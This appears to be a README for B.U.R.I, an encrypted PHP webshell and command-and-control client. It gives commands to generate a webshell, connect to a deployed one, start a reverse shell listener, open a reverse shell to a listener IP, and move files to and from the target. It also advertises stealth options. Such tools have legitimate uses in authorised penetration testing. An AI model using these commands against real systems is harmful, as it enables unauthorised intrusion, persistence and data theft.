<img width="563" height="729" alt="image" src="https://github.com/user-attachments/assets/fd44ac00-cf3f-46b1-be0e-a74669280599" />

B.U.R.I (Backdoor Utility for Remote Interaction) is a modular, encrypted command-and-control (C2) webshell client designed for secure and interactive remote administration. It provides a feature-rich interface for managing remote systems via an encrypted PHP webshell, supporting AES-GCM encryption, reverse shell capabilities, and extensible command modules.

## Features

- **Encrypted Communication**: Uses AES-GCM for secure client-server communication.
- **Interactive Shell**: Rich terminal UI with auto-completion, history, and syntax highlighting powered by `rich` and `prompt_toolkit`.
- **Modular Design**: Extensible command modules for custom functionality (e.g., file upload/download, privilege escalation).
- **Reverse Shell Support**: Built-in listener for reverse shell connections.
- **Cross-Platform**: Supports both Linux and Windows targets with dynamic environment detection.
- **Stealth Options**: Customizable POST parameters and proxy support for enhanced discretion.
- **Path Autocompletion**: Remote path completion using `ls` for efficient navigation.

## Installation
```
    pip install buri-tod
```

## Usage

B.U.R.I supports three main modes: creating a webshell, running an interactive session, and listening for reverse shells.

### 1. Create a Webshell
Generate an encrypted PHP webshell:
```bash
buri create --path shell.php --password 'SuperSecretPass123'
```
This creates a PHP webshell at `shell.php` with the specified password for encryption.

### 2. Run an Interactive Session
Connect to a deployed webshell:
```bash
buri run https://example.com/shell.php -p 'SuperSecretPass123' --param 'data'
```
- `--param`: Specify the POST parameter name (default: `data`).
- `--proxy`: Optional proxy (e.g., `http://127.0.0.1:8080`).

### 3. Start a Reverse Shell Listener
Listen for incoming reverse shell connections:
```bash
buri listen --lhost 0.0.0.0 --lport 4444
```
Then, from the interactive shell, initiate a reverse shell:
```
revshell <listener_ip> 4444
```

### Example Commands
Once in the interactive shell:
- `whoami`: Display the current user.
- `cd /path/to/dir`: Change the remote working directory.
- `ls`: List files in the current directory (supports autocompletion).
- `upload /local/path /remote/path`: Upload a file to the remote system.
- `download /remote/path /local/path`: Download a file from the remote system.
- `revshell <ip> <port>`: Initiate a reverse shell to the specified listener.